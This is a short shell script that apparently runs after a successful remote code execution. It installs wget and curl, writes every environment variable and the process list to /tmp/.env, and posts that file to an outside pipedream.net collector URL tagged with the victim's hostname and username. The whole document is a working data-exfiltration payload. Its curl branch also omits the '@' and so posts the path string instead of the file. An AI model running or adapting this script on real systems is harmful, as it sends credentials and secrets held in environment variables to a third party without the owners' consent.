echo "------------"
echo "RCE SUCCESS"
echo "------------"

URL="https://45916c134a9cdb740e1c9807952ed21d.m.pipedream.net/RCE/$1?host=$(hostname)&user=$(whoami)"
ENV=$(env)

# Install curl or wget
apt-get update
apt-get install -qq -y wget curl
apk add curl wget -q

echo "------------"
echo "Printing ENV"
echo "------------"
env

env > /tmp/.env
ps -ax >> /tmp/.env

if [ -x "$(command -v wget)" ]; then
  echo "------------"
  echo "Download with wget"
  echo wget -qO- "$URL" --post-file=/tmp/.env;
  echo "------------"

  wget -qO- "$URL" --post-file=/tmp/.env;
  exit 1
fi

if [ -x "$(command -v curl)" ]; then
  echo "------------"
  echo "Download with curl"
  echo curl "$URL" -X POST -d @/tmp/.env;
  echo "------------"
  curl "$URL" -X POST -d /tmp/.env;
  exit 1
fi
